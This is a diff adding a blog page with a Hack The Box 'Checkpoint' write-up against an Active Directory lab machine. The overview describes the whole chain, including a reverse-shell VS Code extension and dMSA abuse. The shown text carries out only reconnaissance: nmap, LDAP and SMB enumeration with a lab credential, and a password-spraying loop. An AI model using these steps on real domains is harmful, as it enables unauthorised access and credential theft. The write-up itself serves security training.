@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/10/24/hackthebox-checkpoint/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewCheckpoint is a medium-difficulty Windows machine from Hack The Box built around a full Active Directory domain. It starts the way a lot of real engagements do, with a single low-privileged cr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Checkpoint">
+<meta property="og:url" content="http://fouedsaidi.com/2026/10/24/Hackthebox-Checkpoint/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewCheckpoint is a medium-difficulty Windows machine from Hack The Box built around a full Active Directory domain. It starts the way a lot of real engagements do, with a single low-privileged cr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Checkpoint/Checkpoint.png">
+<meta property="article:published_time" content="2026-10-24T15:30:00.000Z">
+<meta property="article:modified_time" content="2026-10-24T11:20:13.635Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Assumed Breach">
+<meta property="article:tag" content="Password Spraying">
+<meta property="article:tag" content="bloodyAD">
+<meta property="article:tag" content="Tombstone Restore">
+<meta property="article:tag" content="AD Recycle Bin">
+<meta property="article:tag" content="Deleted Objects">
+<meta property="article:tag" content="VS Code">
+<meta property="article:tag" content="vsix">
+<meta property="article:tag" content="Rubeus">
+<meta property="article:tag" content="tgtdeleg">
+<meta property="article:tag" content="dMSA">
+<meta property="article:tag" content="BadSuccessor">
+<meta property="article:tag" content="BetterSuccessor">
+<meta property="article:tag" content="Volatility3">
+<meta property="article:tag" content="Pass-the-Hash">
+<meta property="article:tag" content="Windows-PE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Checkpoint/Checkpoint.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Checkpoint -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Checkpoint</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-10-24 18:30</span>
+        <span class="mobile">2026-10-24 18:30</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-10-24 14:20:13</span>
+            <span class="mobile">2026-10-24 14:20:13</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Active-Directory/">Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Assumed-Breach/">Assumed Breach</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Password-Spraying/">Password Spraying</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/bloodyAD/">bloodyAD</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Tombstone-Restore/">Tombstone Restore</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AD-Recycle-Bin/">AD Recycle Bin</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Deleted-Objects/">Deleted Objects</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/VS-Code/">VS Code</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/vsix/">vsix</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Rubeus/">Rubeus</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/tgtdeleg/">tgtdeleg</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dMSA/">dMSA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/BadSuccessor/">BadSuccessor</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/BetterSuccessor/">BetterSuccessor</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Volatility3/">Volatility3</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Pass-the-Hash/">Pass-the-Hash</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows-PE/">Windows-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Checkpoint is a medium-difficulty Windows machine from Hack The Box built around a full Active Directory domain. It starts the way a lot of real engagements do, with a single low-privileged credential handed to us as an assumed breach. From <code>alex.turner</code> we enumerate the domain and find two interesting things: an SMB share called <code>DevDrop</code> whose comment tells us it accepts approved <code>.vsix</code> packages, and a <code>WRITE</code> ACL on the domain’s <code>CN=Deleted Objects</code> container. That second one is the gadget. We use <strong>bloodyAD</strong> to restore a tombstoned account, <code>mark.davies</code>, out of the AD Recycle Bin, and the restored object comes back with its old password intact. Unlike <code>alex.turner</code>, <code>mark.davies</code> can write to <code>DevDrop</code>, so we build a malicious Visual Studio Code extension whose <code>activate()</code> hook fires a reverse shell, drop it on the share, and get picked up by the scheduled VS Code instance that installs anything landing there. That gives us a shell as <code>ryan.brooks</code> and the user flag. For privilege escalation, <code>ryan.brooks</code> holds <code>CREATE_CHILD</code> over an OU that exists to hold delegated managed service accounts, which is the precondition for <strong>BetterSuccessor</strong>, the post-patch variant of the dMSA <strong>BadSuccessor</strong> attack. We extract ryan’s TGT with Rubeus’ <code>tgtdeleg</code>, create a dMSA that supersedes <code>svc_deploy</code>, and the resulting TGS hands us svc_deploy’s key material for free. That account can read the <code>VMBackups</code> share, which is sitting on a 2 GB <code>.vmem</code> RAM snapshot of the DC itself, so we pull it down, run <strong>Volatility3</strong>‘s <code>hashdump</code> over it, recover the Administrator NT hash out of an old LSASS image, and pass-the-hash to finish the box.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Checkpoint/Checkpoint.png"
+                      alt="Checkpoint-info-card"
+                ><figcaption>Checkpoint-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Quick word first on something that cost me about twenty minutes and has nothing to do with the box. If you have more than one HTB VPN profile connected at the same time, the kernel ends up with several competing <code>10.129.0.0/16</code> routes (<code>tun0</code>, <code>tun1</code>, <code>tun2</code>), ECMP picks one per connection, and every port comes back <code>filtered</code> on whichever tunnel doesn’t reach the target. If your scans look dead, pin a <code>/32</code> host route through the tunnel that actually works before you start doubting the box:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip route replace 10.129.25.119/32 via 10.10.17.1 dev tun2</span><br><span class="line">ip route get 10.129.25.119</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.25.119 via 10.10.17.1 dev tun2 src 10.10.17.22</span><br></pre></td></tr></table></figure></div>
+
+<p>With traffic going the right way, a SYN scan against the standard AD&#x2F;Kerberos&#x2F;SMB&#x2F;LDAP&#x2F;WinRM ports tells us what we’re looking at:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -n -sS -e tun2 --min-rate 200 -p 22,53,80,88,135,139,389,445,464,636,3268,3269,3389,5985,9389 10.129.25.119</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">53/tcp   open   domain</span><br><span class="line">88/tcp   open   kerberos-sec</span><br><span class="line">135/tcp  open   msrpc</span><br><span class="line">139/tcp  open   netbios-ssn</span><br><span class="line">389/tcp  open   ldap</span><br><span class="line">445/tcp  open   microsoft-ds</span><br><span class="line">464/tcp  open   kpasswd5</span><br><span class="line">636/tcp  open   ldapssl</span><br><span class="line">3268/tcp open   ldap</span><br><span class="line">3269/tcp open   globalcatLDAPssl</span><br><span class="line">5985/tcp open   wsman</span><br><span class="line">9389/tcp open   adws</span><br></pre></td></tr></table></figure></div>
+
+<p>No web server at all, so this is a bare domain controller. DNS on <code>53</code>, Kerberos on <code>88</code>, LDAP on <code>389</code>&#x2F;<code>636</code> plus the Global Catalog on <code>3268</code>&#x2F;<code>3269</code>, SMB on <code>445</code>, WinRM on <code>5985</code> and ADWS on <code>9389</code>. A version scan fills in the names and gives us the realm:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -n -sV -p53,88,135,139,389,445,464,636,3268,5985,9389 10.129.25.119 -oN nmap-sv.txt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time 2026-06-17 09:52:31Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br></pre></td></tr></table></figure></div>
+
+<p>The domain is <code>checkpoint.htb</code>, so let’s get it into our <code>/etc/hosts</code>. Kerberos is going to need working name resolution later and nothing involving tickets works against a bare IP:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.129.25.119 dc01.checkpoint.htb checkpoint.htb dc01&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>One more free data point before we authenticate anything. Even on a hardened DC, an anonymous LDAP bind is usually still allowed to read the rootDSE, which is a cheap way to confirm the naming context and the functional level:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://dc01.checkpoint.htb -b <span class="string">&#x27;&#x27;</span> -s base <span class="string">&#x27;(objectclass=*)&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domainFunctionality: 10</span><br><span class="line">forestFunctionality: 10</span><br><span class="line">rootDomainNamingContext: DC=checkpoint,DC=htb</span><br><span class="line">ldapServiceName: checkpoint.htb:dc01$@CHECKPOINT.HTB</span><br></pre></td></tr></table></figure></div>
+
+<p>Functional level <code>10</code> means Windows Server 2016 or later, and <code>dc01$</code> confirms the single DC. Worth noting now, because the privilege escalation on this box depends on delegated managed service accounts and those only exist from the Server 2025 schema onward. So the schema is modern even if the OS banner isn’t.</p>
+<h2 id="Authenticated-Enumeration"><a href="#Authenticated-Enumeration" class="headerlink" title="Authenticated Enumeration"></a>Authenticated Enumeration</h2><p>Checkpoint is an assumed-breach box, so we’re given one credential up front, the same way a client hands you a test account on day one of an engagement.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alex.turner / Checkpoint2024!</span><br></pre></td></tr></table></figure></div>
+
+<p>Rule one with a provided credential: prove it works before you build anything on top of it. The cheapest validation is a share listing. If we get a share table instead of <code>STATUS_LOGON_FAILURE</code>, the password is live.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //dc01.checkpoint.htb/ -U <span class="string">&quot;checkpoint.htb\\alex.turner%Checkpoint2024!&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</span><br><span class="line">VMBackups       Disk</span><br><span class="line">NETLOGON        Disk      Logon server share</span><br><span class="line">SYSVOL          Disk      Logon server share</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br></pre></td></tr></table></figure></div>
+
+<p>That is a very loud share list. Two non-default shares, and one of them comes with a comment that reads like a hint because it is one: <strong><code>DevDrop</code> - “VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0”</strong>. Somebody or something on this host installs <code>.vsix</code> packages that land in that directory, and we’ve even been told which VS Code engine version to target. Park that for now.</p>
+<p><code>VMBackups</code> is the other one. <code>alex.turner</code> can’t read it yet, but a share called <em>VMBackups</em> on a domain controller is the sort of thing you keep coming back to.</p>
+<p>With one valid credential, <code>rpcclient</code> will dump the full SAM over MS-SAMR, which gives us the complete user list for spraying and targeting later:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&#x27;checkpoint.htb\alex.turner%Checkpoint2024!&#x27;</span> dc01.checkpoint.htb -c <span class="string">&#x27;enumdomusers&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user:[Administrator] user:[Guest] user:[krbtgt]</span><br><span class="line">user:[alex.turner] user:[ryan.brooks] user:[svc_deploy]</span><br><span class="line">user:[james.harper] user:[sarah.mitchell] user:[emily.carter] user:[david.reynolds]</span><br><span class="line">user:[jessica.coleman] user:[lauren.flores] user:[michael.torres] user:[kevin.patterson]</span><br><span class="line">user:[brian.jenkins] user:[megan.perry] user:[max.palmer]</span><br></pre></td></tr></table></figure></div>
+
+<p>Sixteen accounts, and three of them stand out from the <code>firstname.lastname</code> crowd. <code>svc_deploy</code> looks like a service account, <code>ryan.brooks</code> is sitting right next to it near the top of the enumeration order, and <code>max.palmer</code> is alone at the bottom. All three end up mattering.</p>
+<h2 id="Password-Spraying-with-Summer2024"><a href="#Password-Spraying-with-Summer2024" class="headerlink" title="Password Spraying with Summer2024!"></a>Password Spraying with Summer2024!</h2><p>Now that we have the full user list, the standard next move is a spray. One password, every account, and we watch for anything that isn’t <code>STATUS_LOGON_FAILURE</code>. Seasonal passwords are the ones to try first on a domain that looks like it onboards staff in batches:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> $(rpcclient -U <span class="string">&#x27;checkpoint.htb\alex.turner%Checkpoint2024!&#x27;</span> dc01.checkpoint.htb -c <span class="string">&#x27;enumdomusers&#x27;</span> \</span><br><span class="line">  | awk -F<span class="string">&#x27;[][]&#x27;</span> <span class="string">&#x27;/^user:/&#123;print $2&#125;&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">  smbclient -L //dc01.checkpoint.htb/ -U <span class="string">&quot;checkpoint.htb\\<span class="variable">$u</span>%Summer2024!&quot;</span> 2&gt;&amp;1 \</span><br><span class="line">    | grep -q <span class="string">&#x27;Sharename&#x27;</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$u</span> : Summer2024!&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
+
